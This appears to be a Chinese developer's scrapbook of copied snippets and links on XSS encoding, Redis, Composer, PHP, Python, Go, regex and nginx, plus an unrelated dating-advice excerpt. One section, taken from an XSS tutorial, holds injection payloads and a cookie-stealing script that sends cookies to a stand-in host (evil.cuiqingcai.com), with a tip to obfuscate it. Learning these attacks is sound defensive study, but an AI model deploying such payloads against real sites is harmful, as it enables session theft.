[xss测试编码工具](https://xss.haozi.me/tools/xss-encode/)
```js
var encodeObj = document.getElementById("encode");
var encodeObjResult = document.getElementById("encode_result");
var decodeObj = document.getElementById("decode");
var decodeObjResult = document.getElementById("decode_result");
var dianji = document.getElementsByTagName("button");
for (var i = 0; i < dianji.length; i++) {
    dianji[i].onclick = function () {
        var type = this.getAttribute("leixing");
        if (type == "jiami") {
            jiami(this.name);
        }
        if (type == "jiemi") {
            jiemi(this.name)
        }
    }
}

function jiami(s) {
    //把传入的值 赋给变量 encode
    var encode = s;
    //if选择的url编码 则进入url编码 代码块
    if (encode == "url") {
        try {
            encodeObjResult.value = encodeURIComponent(encodeObj.value);
        }
        catch (e) {
            alert(e);
        }
    }

    //如果选择的html实体编码十进制
    if (encode == "html10") {
        try {
            var jieguo = "";
            for (var i = 0; i < encodeObj.value.length; i++) {
                jieguo += "&#" + encodeObj.value.charCodeAt(i) + ";";
            }
            encodeObjResult.value = jieguo;
        }
        catch (e) {
            alert(e);
        }
    }

    //如果选择的html实体编码十六进制
    if (encode == "html16") {
        try {
            var jieguo = "";
            for (var i = 0; i < encodeObj.value.length; i++) {
                jieguo += "&#x" + encodeObj.value.charCodeAt(i).toString(16) + ";";
            }
            encodeObjResult.value = jieguo;
        }
        catch (e) {
            alert(e);
        }
    }

    //如果选择的编码是js unicode编码
    if (encode == "jsunicode") {
        try {
            var jieguo = "";
            for (var i = 0; i < encodeObj.value.length; i++) {
                jieguo += "\\u00" + encodeObj.value.charCodeAt(i).toString(16);
            }
            encodeObjResult.value = jieguo;
        }
        catch (e) {
            alert(e);
        }
    }

    //如果选择的是js16进制编码
    if (encode == "js16") {
        try {
            var jieguo = "";
            for (var i = 0; i < encodeObj.value.length; i++) {
                jieguo += "\\x" + encodeObj.value.charCodeAt(i).toString(16);
            }
            encodeObjResult.value = jieguo;
        }
        catch (e) {

            alert(e);
        }
    }

    //如果选择的是js8进制编码
    if (encode == "js8") {
        try {
            var jieguo = "";
            for (var i = 0; i < encodeObj.value.length; i++) {
                jieguo += "\\" + encodeObj.value.charCodeAt(i).toString(8);
            }
            encodeObjResult.value = jieguo;
        }
        catch (e) {
            alert(e);
        }
    }

    //如果选择的是base64编码
    if (encode == "base64") {
        try {
            encodeObjResult.value = btoa(encodeObj.value);
        }
        catch (e) {
            alert(e.message);
        }
    }
}

//以上是加密函数
//以下是解密函数

function jiemi(s) {
    //创建一个变量接受传过来的解码方式
    var decode = s;
    //如果解码方式等于URL
    if (decode == "url") {
        try {
            decodeObjResult.value = decodeURIComponent(decodeObj.value);
        }
        catch (e) {
            alert(e);
        }
    }

    //如果解码方式是html实体编码十进制
    if (decode == "html10") {
        try {
            var jieguo = "";
            var jieguoary = decodeObj.value.split("&#");
            for (var i = 1; i < jieguoary.length; i++) {
                jieguo += String.fromCharCode(parseInt(jieguoary[i].replace(';', '')));
            }
            decodeObjResult.value = jieguo;
        }
        catch (e) {
            alert(e);
        }
    }

    //如果解码方式是html实体编码十六进制
    if (decode == "html16") {
        try {
            var jieguo = "";
            var jieguoary = decodeObj.value.split("&#x");
            for (var i = 1; i < jieguoary.length; i++) {
                jieguo += String.fromCharCode(parseInt(jieguoary[i], 16));
            }
            decodeObjResult.value = jieguo;
        }
        catch (e) {
            alert(e);
        }
    }

    //如果解码方式是js unicode编码
    if (decode == "jsunicode") {
        try {
            var jieguo = "";
            var jieguoary = decodeObj.value.split("\\u00");
            for (var i = 1; i < jieguoary.length; i++) {
                jieguo += String.fromCharCode(parseInt(jieguoary[i], 16));
            }
            decodeObjResult.value = jieguo;
        }
        catch (e) {
            alert(e)
        }
    }

    //如果解码方式是js16进制编码
    if (decode == "js16") {
        try {
            var jieguo = "";
            var jieguoary = decodeObj.value.split("\\x");
            for (var i = 1; i < jieguoary.length; i++) {
                jieguo += String.fromCharCode(parseInt(jieguoary[i], 16));
            }
            decodeObjResult.value = jieguo;
        }
        catch (e) {
            alert(e);
        }
    }

    //如果解码方式是js8进制编码
    if (decode == "js8") {
        try {
            var jieguo = "";
            var jieguoary = decodeObj.value.split("\\");
            for (var i = 1; i < jieguoary.length; i++) {
                jieguo += String.fromCharCode(parseInt(jieguoary[i], 8));
            }
            decodeObjResult.value = jieguo;
        }
        catch (e) {
            alert("e");
        }
    }


    //如果解码方式是base64编码
    if (decode == "base64") {
        try {
            decodeObjResult.value = atob(decodeObj.value);
        }
        catch (e) {
            alert("e");
        }
    }
}

此网站为英文页面, 是否需要翻译?翻译网页鼠标悬停翻译×不再翻译此网站人工翻译
```

[Web安全学习一之XSS漏洞的利用](http://cuiqingcai.com/3133.html)
```js
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TEST XSS</title>
</head>
<body>
    <script>
        function test() {
            var text = document.getElementById('text').value;
            var new_text = '<a href="' + text + '">test</a>';
            console.log(new_text);
            document.getElementById('content').innerHTML = new_text;
        }
    </script>
<div id="content"></div>
<input type="text" id="text" value="">
<input type="button" id="button" value="提交" onclick="test()">
</body>
</html>

javascript:void(0)" onclick=alert('ssss') " "><img src="#" onerror=alert(/xss/)><meta class="
 
var img = document.createElement('img');
img.src = 'http://evil.cuiqingcai.com/cookie.php?url='+escape(window.location.href)+'&content='+escape(document.cookie);
img.style = 'display:none';
document.body.appendChild(img);
javascript:void(0)"></a><script src="//evil.cuiqingcai.com/cookie.js"></script><a class="
javascript:void(0)"></a><img src=# onerror="document.body.appendChild(document.createElement('script')).src='//evil.cuiqingcai.com/cookie.js'"><a class="
为了防止JavaScript被看出来，可以利用在线加密网站加密。http://tool.chinaz.com/js.aspx
```


[redis配置文件redis.conf参数说明](http://coolaf.com/article/80.html)
```js
统计项目的java代码总行数 http://coolaf.com/article/67.html


Bash代码

wc -l $(find . -type f -name '*.java')
[root@rac1 redis-2.6.8]# vi /etc/redis_master.conf
# 快照保存规则，如
save 900 1 #900秒内如果超过1个key被修改，则发起快照保存
save 300 10 #300秒内容如超过10个key被修改，则发起快照保存
save 60 10000
# 最多使用数据库的个数
databases 16
# 快照文件的名字
dbfilename dump.rdb
# 快照存放的目录
dir /opt/redis-2.6.8
# 数据文件是否要压缩。（为了方便查看数据文件内容，设置成no）
rdbcompression no
# redis操作的口令
# requirepass foobared
# Append Only File 功能被关闭（注意：为了更好测试快照功能，此功能最好关闭）
appendonly no
# daemonize：指定Redis是否后台运行
daemonize yes
redis-server /etc/redis_master.conf > redis_master.log 2>&1 &
再次重启redis，加载快照，发现未save保存的ddd丢失

实现AOF功能只需要修改配置参数appendonly yes
-查看日志文件
[root@rac1 redis-2.6.8]# cat appendonly.aof
```
[Composer进阶使用之常用命令和版本约束](http://cuiqingcai.com/3494.html)
```js
Composer会先找到合适的版本，然后更新composer.json文件，在require那添加monolog/monolog包的相关信息，再把相关的依赖下载下来进行安装，最后更新composer.lock文件并生成php的自动加载文件。
$ composer update
 
# 更新指定的包
$ composer update monolog/monolog
 
# 更新指定的多个包
$ composer update monolog/monolog symfony/dependency-injection
 
# 还可以通过通配符匹配包
$ composer update monolog/monolog symfony/*
# 列出所有已经安装的包
$ composer show

# 可以通过通配符进行筛选
$ composer show monolog/*

# 显示具体某个包的信息
$ composer show monolog/monolog
$ composer require monolog/monolog:1.19

# 或者
$ composer require monolog/monolog=1.19

# 或者
$composer require monolog/monolog 1.19

^0.3会被当作>=0.3.0 <0.4.0对待 1.0.*相当于>=1.0 <1.1。
```
[极验验证码(Geetest) Laravel 5 集成开发包, 滑动二维码让验证更安全  ](http://cuiqingcai.com/2988.html)
[Mac下升级PHP版本至7.1](http://cuiqingcai.com/3992.html)
[使用Python收集获取Linux系统主机信息](http://cuiqingcai.com/3801.html)
```js
#!/usr/bin/env python
#encoding: utf-8

'''
收集主机的信息：
主机名称、IP、系统版本、服务器厂商、型号、序列号、CPU信息、内存信息
'''

from subprocess import Popen, PIPE
import os,sys

''' 获取 ifconfig 命令的输出 '''
def getIfconfig():
    p = Popen(['ifconfig'], stdout = PIPE)
    data = p.stdout.read()
    return data

''' 获取 dmidecode 命令的输出 '''
def getDmi():
    p = Popen(['dmidecode'], stdout = PIPE)
    data = p.stdout.read()
    return data

''' 根据空行分段落 返回段落列表'''
def parseData(data):
    parsed_data = []
    new_line = ''
    data = [i for i in data.split('\n') if i]
    for line in data:
        if line[0].strip():
            parsed_data.append(new_line)
            new_line = line + '\n'
        else:
            new_line += line + '\n'
    parsed_data.append(new_line)
    return [i for i in parsed_data if i]

''' 根据输入的段落数据分析出ifconfig的每个网卡ip信息 '''
def parseIfconfig(parsed_data):
    dic = {}
    parsed_data = [i for i in parsed_data if not i.startswith('lo')]
    for lines in parsed_data:
        line_list = lines.split('\n')
        devname = line_list[0].split()[0]
        macaddr = line_list[0].split()[-1]
        ipaddr  = line_list[1].split()[1].split(':')[1]
        break
    dic['ip'] = ipaddr
    return dic

''' 根据输入的dmi段落数据 分析出指定参数 '''
def parseDmi(parsed_data):
    dic = {}
    parsed_data = [i for i in parsed_data if i.startswith('System Information')]
    parsed_data = [i for i in parsed_data[0].split('\n')[1:] if i]
    dmi_dic = dict([i.strip().split(':') for i in parsed_data])
    dic['vender'] = dmi_dic['Manufacturer'].strip()
    dic['product'] = dmi_dic['Product Name'].strip()
    dic['sn'] = dmi_dic['Serial Number'].strip()
    return dic

''' 获取Linux系统主机名称 '''
def getHostname():
    with open('/etc/sysconfig/network') as fd:
        for line in fd:
            if line.startswith('HOSTNAME'):
                hostname = line.split('=')[1].strip()
                break
    return {'hostname':hostname}

''' 获取Linux系统的版本信息 '''
def getOsVersion():
    with open('/etc/issue') as fd:
        for line in fd:
            osver = line.strip()
            break
    return {'osver':osver}

''' 获取CPU的型号和CPU的核心数 '''
def getCpu():
    num = 0
    with open('/proc/cpuinfo') as fd:
        for line in fd:
            if line.startswith('processor'):
                num += 1
            if line.startswith('model name'):
                cpu_model = line.split(':')[1].strip().split()
                cpu_model = cpu_model[0] + ' ' + cpu_model[2]  + ' ' + cpu_model[-1]
    return {'cpu_num':num, 'cpu_model':cpu_model}

''' 获取Linux系统的总物理内存 '''
def getMemory():
    with open('/proc/meminfo') as fd:
        for line in fd:
            if line.startswith('MemTotal'):
                mem = int(line.split()[1].strip())
                break
    mem = '%.f' % (mem / 1024.0) + ' MB'
    return {'Memory':mem}

if __name__ == '__main__':
    dic = {}
    data_ip = getIfconfig()
    parsed_data_ip = parseData(data_ip)
    ip = parseIfconfig(parsed_data_ip)
    
    data_dmi = getDmi()
    parsed_data_dmi = parseData(data_dmi)
    dmi = parseDmi(parsed_data_dmi)

    hostname = getHostname()
    osver = getOsVersion()
    cpu = getCpu()
    mem = getMemory()
    
    dic.update(ip)
    dic.update(dmi)
    dic.update(hostname)
    dic.update(osver)
    dic.update(cpu)
    dic.update(mem)

    ''' 将获取到的所有数据信息并按简单格式对齐显示 '''
    for k,v in dic.items():
        print '%-10s:%s' % (k, v)
```
Fastcgi会先启一个master，解析配置文件，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然是高。而且当worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源。这就是fastcgi的对进程的管理。
 PHP的解释器是php-cgi。php-cgi只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理（皇上，臣妾真的做不到啊！）所以就出现了一些能够调度php-cgi进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。好了PHP-FPM也是这么个东东 php-fpm的管理对象是php-cgi。但不能说php-fpm是fastcgi进程的管理器，因为前面说了fastcgi是个协议 PHP内核集成了PHP-FPM之后就方便多了，使用--enalbe-fpm这个编译参数即可
brew install homebrew/php/php71
brew install homebrew/php/php71-mcrypt
ln -s /usr/local/opt/php71/sbin/php-fpm /usr/local/bin/php-fpm
[Laravel maatwebsite/excel 数字自动转为科学记数法](https://segmentfault.com/q/1010000008780156)
开发了一个xavxsl的excel插件，最终吧所有字段都以字符串的形式读取出来了https://git.oschina.net/xavier007/Xavxls
[前端学习项目实践练手](https://segmentfault.com/q/1010000008594563)
[Python 遍历文件夹，统计所有不同后缀的文件数量与比例](https://segmentfault.com/q/1010000008779929)
```js
#coding: utf-8

import os
from itertools import groupby

file_lst = []
for path, dir, files in os.walk('./'):
    file_lst += files

file_count = len(file_lst) * 1.0

for key, lst in groupby(file_lst, key=lambda x: os.path.splitext(x)[1]):
    print key, round(len(list(lst))/file_count, 2)
#看第二种：

#coding: utf-8

import os
from collections import defaultdict

file_count = 1.0
res = defaultdict()
for path, dir, files in os.walk('./'):
    file_count += len(files)
    for file in files:
        suf = os.path.splitext(file)[1]
        res[suf] = res.setdefault(suf, 0) + 1

for k, v in res.iteritems():
    print k, round(v/file_count, 4) * 100
file_lst = []
for path, dir, files in os.walk('./'):
    file_lst += files
file_count = len(file_lst) * 1.0
for key, lst in groupby(file_lst, key=lambda x: os.path.splitext(x)[0]):
    if cmp(key, 'tvmticket') == 0:
      pass

```
[js 数组分组？](https://segmentfault.com/q/1010000008789413)
```js
var obj = {};
var list = ['1-10','1-20','1-22','2-2','2-3','2-4','3-1','3-5','4-6','5-10'];
list.forEach(function(e){
  var index = e.split('-')[0];
  if(!obj[index]){
    obj[index] = [];
  }
  obj[index].push(e);

})
如：1-* 为第一组；
   2-* 为第二组；
   ....
以此类推
lodash https://lodash.com/docs/4.17.4

const ret = _.groupBy(list, e => e.split('-')[0])
https://segmentfault.com/q/1010000008789660
function rule3(v, vmin, vmax, tmin, tmax) {
    var nv = Math.max(Math.min(v, vmax), vmin);
    var dv = vmax - vmin;
    var pc = (nv - vmin) / dv;
    var dt = tmax - tmin;
    var tv = tmin + (pc * dt);
    return tv;
}

```
[php 根据给定字符串时间获取时区](https://segmentfault.com/q/1010000008705799)
```js
$dt = new DateTime($datetime); //用你提供的时间字符串创建对象
$tz = $dt->getTimezone(); //获取时区对象
echo $tz->getName(); //输出时区名称
$tz2 = new DateTimeZone('GMT'); //新建时区对象
$dz->setTimezone($tz2); //设置新时区
echo $dz->format('c'); //输出ISO 8601格式的时间，就是你上面提供的那种格式
```

[redis配置文件redis.conf参数说明](http://coolaf.com/article/80.html)
[file_get_contents 通过get或者post携带的参数，在地址所在的那个方法里获取不到get或post数据](https://segmentfault.com/q/1010000008777693)
```js
$postdata = http_build_query($post_data);    
      $options = array(    
            'http' => array(    
                'method' => 'get',    
                'header' => 'Content-type:application/x-www-form-urlencoded',    
                'content' => $postdata,    
                'timeout' => 15 * 60 // 超时时间（单位:s）    
            )    
        );    
        $context = stream_context_create($options);    
        $result = file_get_contents($url, false, $context);             
        return $result;    
	那么原因就很简单了：
'method' => 'get', 这个地方指定HTTP METHOD的时候要使用大写的。

比如 'method' => 'GET', , 或者 'method' => 'POST', .

修改后亲测有效。
```
[Update query wrong in MySQL](https://segmentfault.com/q/1010000008784044)
```js
 #!/bin/bash
    mysql -u root -pPassword <<rc
    use rc;
    SELECT *,
           CASE 
             WHEN cutoff_dt IS NULL
           THEN 
             UPDATE rc SET cutoff_dt = '2017-03-21 00:00:00.0'
             ELSE 'NOT NULL'
          END
    from rc
    WHERE business_date = '2017-03-21 16:50:29.032';
    rc
```


[正则表达式匹配多次出现的内容](https://segmentfault.com/q/1010000008783787)
```js
var body = '<img src="file:///storage/emulated/0/DCIM/Screenshots/Screenshot_hahaha.png" alt=""><img src="file:///storage/emulated/0/DCIM/Screenshots/Screenshot_lalala.png" alt="">'

var sources = []
var imgReg = /<img src=\"(.*?)\"/g
var match
while((match = imgReg.exec(body))){
    sources.push(match[1])
}
console.log(sources)

$imgreg = "/<img src=\"(.*?)\"/";
if(preg_match_all($imgreg, $body, $matches)){
    var_dump($matches[1]);
}
```




[API GET和POST测试工具(支持需要登录的接口调用:高级功能->填写cookie)在线执行代码](http://coolaf.com/)
https://glot.io  https://github.com/prasmussen/glot 
[开放现代的Web组件化框架](https://github.com/AlloyTeam/omi)
[Sublime Text 3 格式代码插件 codeFormatter](http://www.cnblogs.com/xp796/p/5715510.html)
默认快捷键ctrl+alt+F，默认可以对html、js、css格式代码， 如果想对PHP格式化，需要PHP5.6以上版本，而且需要配置sublime的(package setttings > codeFormatter > settings user)中设定php.exe的路径
[golang 抓取网页信息（用goquery）](http://coolaf.com/article/25.html)
```js
package main

import (
  "fmt"
  "log"

  "github.com/PuerkitoBio/goquery"
)

func ExampleScrape() {
  doc, err := goquery.NewDocument("http://metalsucks.net") 
  if err != nil {
    log.Fatal(err)
  }

  doc.Find(".reviews-wrap article .review-rhs").Each(func(i int, s *goquery.Selection) {
    band := s.Find("h3").Text()
    title := s.Find("i").Text()
    fmt.Printf("Review %d: %s - %s\n", i, band, title)
  })
}

func main() {
  ExampleScrape()
}

import (
    "crypto/md5"
    "encoding/hex"
    "fmt"
    "testing"
)

func Test_md5(t *testing.T) {

    str := "帮我做下md5"
    //用直接用md5中sum函数加密
    m1 := md5.Sum([]byte(str))
    fmt.Printf("%s", hex.EncodeToString(m1[:]))
    fmt.Println()
    //这个是通过md5包中的new方法，产生一个hash,利用hash中的sum生成md5
    m2 := md5.New()
    m2.Write([]byte(str))
    s := hex.EncodeToString(m2.Sum(nil))
    fmt.Println(s)

}

```
[php 导出excel ](http://coolaf.com/article/84.html)
```js
with open('massive-body') as f:
    requests.post('http://some.url/streamed', data=f)
s = requests.Session()
s.headers.update({'x-test': 'true'})
function excel($filename, $title=array(), $content=array()) {


	$filename = empty($filename) ? date('Ymd') . rand(1, 100000) : $filename;
	$filename = iconv("utf-8", "gb2312", $filename);
	header("Content-Type: application/vnd.ms-excel; charset=UTF-8");
	header("Pragma: public");
	header("Expires: 0");
	header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
	header("Content-Type: application/force-download");
	header("Content-Type: application/octet-stream");
	header("Content-Type: application/download");
	header("Content-Disposition: attachment;filename={$filename}.xls ");
	header("Content-Transfer-Encoding: binary ");
	if (!empty($title)) {
		foreach ($title as $key => $value) {
			echo iconv("utf-8", "gb2312", $value) . "\t";
		}
		echo "\n";
	}
	if (!empty($content)) {
		foreach ($content as $key => $value) {
			foreach ($value as $k => $v) {
				echo iconv("utf-8", "gb2312", $v) . "\t";
			}
			echo "\n";
		}
		return true;
	}
}
```


###根据每分钟的数据统计每天最大的数据
```js
$arr=[
['s'=>10,'d'=>1489981380],
['s'=>100,'d'=>1489981440],
['s'=>20,'d'=>1489981620],
  ['s'=>16,'d'=>1489981740],
  ['s'=>12,'d'=>1489981920],
  ['s'=>12,'d'=>1489982100],
  ['s'=>12,'d'=>1489982160],
  ['s'=>198,'d'=>1499992220],
];
$chartData=[];
foreach($arr as $item){
if (!isset($chartData[date('Y-m-d', $item['d'])])) {
                            $chartData[date('Y-m-d', $item['d'])] = $item['s'];
                        } else {
                            if ($item['s'] > $chartData[date('Y-m-d', $item['d'])]) {
                                $chartData[date('Y-m-d', $item['d'])] = $item['s'];
                            }
                        }

}
print_r($chartData);
Array
(
    [2017-03-20] => 100
    [2017-07-14] => 198
)
$res=[];
foreach($arr as $v){
   $res[date('Y-m-d', $v['d'])][]=$v['s'];
}
print_r($res);

Array
(
    [2017-03-20] => Array
        (
            [0] => 10
            [1] => 100
            [2] => 20
            [3] => 16
            [4] => 12
            [5] => 12
            [6] => 12
        )

    [2017-07-14] => Array
        (
            [0] => 198
        )

)
```
[sublime 有哪个插件支持php代码格式化吗](https://segmentfault.com/q/1010000008738911)
最好用的是phpfmt   安装后，是没法用的，需要设置 php的路径
![vv](https://segmentfault.com/img/bVKRAj?w=976&h=539)

[php正则匹配一个Mardown语法](https://segmentfault.com/q/1010000008750479)
$res = preg_replace("/\[(.*)\]\((.*)\)/Uis", "<a href='\\2'>\\1</a>", '[百度](http://baidu.com/)');

[正则表达式匹配@和空格之间的字符](https://segmentfault.com/q/1010000008594625)
preg_match('/@(.*) /', 'AAA@XXX YYYY', $result);
[php 的扩展包monolog/monolog](https://segmentfault.com/q/1010000008772011)

很多时候确实也不想记录日志，记录了会占用服务器磁盘空间，网站访问量大的话一天几百兆甚至上G的空间也是蛮大的负担。但是运维过程中，经常会发生各种各样的错误和异常，你不记录日志的话这些错误和异常就只能靠复现了。而记录日志的话，看看日志很多时候就明白了。

此外，和其他系统之间的接口之类的如果不记录日志，出了问题那就扯不清了。

第二，为什么要用pushHandler这种方式？

就我做过的一个项目，日志除了记录到文件外，还要发送到ELK上，还要把错误日志发送邮件给运维人员，如果直接写死也太死板了，通过pushHandler增加各种处理器来处理会很灵活的。

像 WhatFailureGroupHandler 这种前人总结好的handler还能提高记录日志的性能，也省去了很多自己重复造轮子的工作量。
vuejs 官方文档地址：http://vue.sike.io/v2/guide
[mzphp2加密文件](https://segmentfault.com/q/1010000008659023)
//decode by 小猪php解密 QQ:2338208446 http://www.xzjiemi.com/
[男生送给女生特别用心的礼物](https://www.zhihu.com/question/27581416)
我看过的最感动的一封信，不是写给我的，是我朋友的。她老公在和她恋爱的时候，给她写的。具体的肯定不记得，大概是这样：我不知道我跟她能不能走到最后，如果没有，请后面的你看看，好好的照顾她。如果你和她逛超市看到毛茸茸的玩具，她会抱一抱，但是放心，她不会要你买，她只是喜欢抱一抱。如果你和她一起吃饭，记得先把餐具用水洗一洗，她喜欢干净。如果吃完饭，她执意要付钱，请不要和她争，她好强。如果她做PPT，请以一定要耐心教，她总是记不住那些到底是什么。如果和她出去玩，记得拉好她的手，她不记得路的。如果……如果…… 欲获得本书《如何让美少女来追你》完整版的朋友可关注我们的 微信公众号 Smileblgg 回复 “书籍” 即可获得相关的书籍下载方式
FDC原则。
感受+细节+对比。

你真美。
细节：你的眼睫毛特别长。你的眼睛特别明亮。
感受：看到你的笑，我心都软了。
对比：你刚才走进来，让整个餐厅的人都黯然失色。
[动画片图片搜索](https://github.com/soruly/whatanime.ga)
 var oUl=document.getElementById('ul'); oUl.setAttribute('style', 'height: 200px;');
[URL重写](https://segmentfault.com/q/1010000008774702)
```js
如果是apache就不会出现这问题了.因为apache支持.htaccess,在.htaccess中TP官方已经帮你写好了重写规则

但是在Nginx中不支持.htaccess只能自己去写重写规则.

可以用try_files来实现URL重写.下面这是我的laravel项目重写,你可以参考下!

 location / {
            try_files $uri $uri/ /index.php?$query_string;
        }
        server
    {
        listen 80;
    #listen [::]:80;
    server_name yourdomain.com;
        index index.php index.html index.htm  default.html default.htm default.php;
        root  /home;#你的项目下能直接访问到Index.php入口文件的目录
        #如我的index.php在/home/index.php则这里配置到/home;

        include other.conf;
        #error_page   404   /404.html;
        include enable-php.conf;

        location / {
            try_files $uri $uri/ /index.php?$query_string;
        }

        location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$
        {
            expires      30d;
        }

        location ~ .*\.(js|css)?$
        {
            expires      12h;
        }

        location ~ /\.
        {
            deny all;
        }

        access_log /home/access.log; #成功访问日志地址如:/home/access.log;
    }

```
[微信扫码登录](https://segmentfault.com/q/1010000008770313)
截图是jsonp，而不是ajax，当然用ajax也可以
pending是请求发出后，等待服务端返回数据的过程，跟js无关
是的，本质上是服务端轮询本地资源，是否到达可以返回数据的状态，否则就继续循环，循环的过程中为了避免cpu消耗过高，会进行sleep。 不过对于事件驱动的服务端语言比如nodejs，有更方便的实现
在返回的接送字符串中返回了不可见的字符，例如BOM头，试试如下处理，
$info = json_decode(trim($info,chr(239).chr(187).chr(191)),true);
本地跑也是没有问题的，但是在服务器跑 从 file_get_contents('php://input') 解析就会出错 错误编号$ret = json_last_error();是4


[在input 输入框前加个 ¥ 符号，然后输入框的字从后往前](https://segmentfault.com/q/1010000008771120)
```js
//placeholder默认事件
<input type="text" placeholder="¥"  dir="rtl"/>
//因为input不支持:after:before 所以可以用bgimg
input{ background-image: url(...) }

<style>
    div{
      position: relative;
    }
    input{
      position: relative;
      background-color: rgba(0,0,0,0)
    }
    .back{
      position: absolute;
      top: 2px;
      left: 5px;
      display: inline-block;
      color: rgba(1,1,1,0.5)
    }
</style>
<div>
    <input type="text"/>
    <div class="back">¥</div>
</div>
```
[页面追加内容的最好方法是什么](https://segmentfault.com/q/1010000008773167)
```js
<button onclick="add(this)"></button>
<script> 
    function add(obj)
    { 
        $("<div>我是追加的内容</div>").after($(obj))
    }   
</script>
var tpl = [
    '<div class="datepicker ui-d-n">',
    '    <div class="datepicker__mask"></div>',
    '    <div class="datepicker__main">',
    '        <div class="datepicker__footer">',
    '            <div class="datepicker__btn" id="_j_confirm_btn">确定</div>',
    '            <div class="datepicker__btn" id="_j_cancel_btn">取消</div>',
    '        </div>',
    '    </div>',
    '</div>'
].join("");
js数组不失为一种上佳选择。
```

[删除txt文件内所有<>里面的内容包括<>本身](https://segmentfault.com/q/1010000008773191)
```js
# python3 code https://github.com/dokelung/Python-QA

import re

# for example
s = '123<><here>#$%@#$%^<123>::<a class="haha" href="http://www.hello.com">haha'
print(re.sub('<[^>]*>', '', s))

# read txt and remove all <...>
with open('your.txt', 'r') as reader:
    for line in reader:
        line = line.strip()
        print(re.sub('<[^>]*>', '', line))
```

[手机和电脑是同时连着公司的同一个wifi](https://segmentfault.com/q/1010000008772829)
我觉得必须是你自己电脑开的wifi才可以这么玩，因为你的localhost是你在本机上启用的服务器，单纯处于一个公用wifi应该是不行的，你怎么通过公用wifi访问本机服务器呢？
手机和电脑要用同一个wifi,然后打开cmd, ipconfig 看下ip是什么，把这个本机的192.168.0.102换掉，端口号仍然需要的，然后在手机端浏览器中输入新的地址
[service mysql.server start 启动失败](https://segmentfault.com/q/1010000008771837)
```js
讲道理mysql应该是从
--defaults-file 指定的地址去读取配置文件
其次读取
--defaults-file-extra 指定的地方读取配置文件

这两者我都没有指定过，那么，读取的顺序应该是：

/etc/my.cnf

/etc/mysql/my.cnf

~/mysql/my.cnf

..
逐步去读取配置文件，但是启动一直报错pid文件目录找不到。
然而，我/etc/my.cnf指定的pid是
文件是 $base_dir目录，报错却不是这个目录。
因此我估计是配置文件的读取顺序和步骤跟我想象的不一样，所以我删除了其它目录的my.cnf文件。
即：删除了 /etc/mysql[my.cnf]目录

fixed。

结果解决了，但是留下一个问题，为什么首先读取的配置文件不是/etc/my.cnf文件。待了解。
```


[JS如何实现类似Jquery的siblings功能？](https://segmentfault.com/q/1010000008773218)
```js
Element.prototype.siblings = function(callback){
    var siblingElement = [];
    var parentAllElement = [];
    if( ! this.parentNode ){
        return siblingElement;
    };
    parentAllElement = this.parentNode.getElementsByTagName(this.tagName);
    for( var i = 0; i < parentAllElement.length ; i++ ){
        if( parentAllElement[i] != this ){
            siblingElement.push(parentAllElement[i]);
            typeof callback == "function" && callback.call(parentAllElement[i]);
        }
    }
    return siblingElement;
};
然后就可以向 jQuery 一样使用 siblings() 了。

var link = document.getElementsByTagName("a");
for (var i = 0; i < link.length; i++) {
    link[i].addEventListener("click", function() {
        this.style.backgroundColor = "#000";
        var siblings = this.siblings(function(){
            this.style.backgroundColor = "#FFF";
        });
        console.log(siblings[0].siblings());
    })
}
```
查看redis-cli --help查看--eval的语法
 有redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3
https://redis.io/commands/eval itchatmp&itchat 结合使用
https://zhuanlan.zhihu.com/p/23742990 
[一个用Go写的微信机器人](https://github.com/KevinGong2013/ggbot)
https://github.com/KevinGong2013/wechat
[python生成固定长度的随机字符串](https://www.oschina.net/code/snippet_153443_4752)
```js
import random, string
def random_str(randomlength=8):
    a = list(string.ascii_letters)
    random.shuffle(a)
    return ''.join(a[:randomlength])

salt = ''.join(random.sample(string.ascii_letters + string.digits, 8)) random.randint(1000,9999)
seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+=-"
sa = []
for i in range(8):
    sa.append(random.choice(seed))
salt = ''.join(sa)
from random import Random
def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 1
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str
print(uuid.uuid1())
```

PHP设计模式问题https://segmentfault.com/q/1010000008736793
最好用的是phpfmt sublime
php 怎么获取当前月份往前24个月中的每个月的订单总和https://segmentfault.com/q/1010000008734802
https://segmentfault.com/q/1010000008357070  背包算法PHP或Javascript实现方案
php中static当实例化方法用是什么意思https://segmentfault.com/q/1010000008715451
无限级分类，tp_user 应该新增一个字段 path 。path值为 0-1、0-1-2 等等。

然后，sql查询：select id,name, parent_id,path,concat(path,'-',id) as bpath, from tp_user order by bpathhttps://segmentfault.com/q/1010000008537364
[微信公众平台开发工具集](http://www.cnblogs.com/txw1958/p/weixin-tools-list.html)
PHP怎么获取每个月的最后一个周五日期https://segmentfault.com/q/1010000008708171
在curl请求的url上加一个XDEBUG_SESSION_START=1就可以了。 xdebug helper也就是加的这个参数. 如果url里有这个参数，并且也不需要xdebug helper trace等功能的话,完全就可以不用helper了.
https://segmentfault.com/q/1010000008704638
订单拆分成子订单问题求教https://segmentfault.com/q/1010000008703173
判定前端调用后端接口超时？https://segmentfault.com/q/1010000008684983
2038年的问题https://segmentfault.com/q/1010000008671369
遍历目录并下载文件 https://segmentfault.com/q/1010000008675464
https://segmentfault.com/q/1010000008682636
sublime中PHP有调用模型https://segmentfault.com/q/1010000008681529
msyql的锁机制，解锁是自动解锁吗https://segmentfault.com/q/1010000008683232
高并发抢单时,锁表的疑惑？https://segmentfault.com/q/1010000008676397
preg_match的理解https://segmentfault.com/q/1010000008635436
https://segmentfault.com/q/1010000008661892  https://segmentfault.com/q/1010000008668318
var iframe = document.getElementById('test')
// 取到 iframe 内的 document 对象，然后用这个对象去查找里面的表单
var iframeDoc = iframe.contentWindow.document  
